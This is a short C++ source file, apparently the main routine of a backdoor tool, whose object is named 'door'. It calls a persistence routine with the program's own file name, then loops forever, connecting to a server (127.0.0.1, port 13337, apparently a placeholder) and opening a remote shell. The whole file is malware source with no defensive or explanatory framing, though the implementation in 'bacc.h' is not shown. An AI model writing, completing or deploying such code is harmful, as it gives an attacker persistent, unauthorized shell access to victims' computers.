#include "bacc.h"

int main(int argc, char **argv) {
    bacc* door = bacc::get_instance();

    std::string programName(argv[0]);
    programName = programName.substr(programName.find_last_of("\\") + 1);
    door->persist(programName);

    while (true) {
        door->connect_to_server("127.0.0.1", "13337");
        door->pop_shell();
    }

    return 0;
}
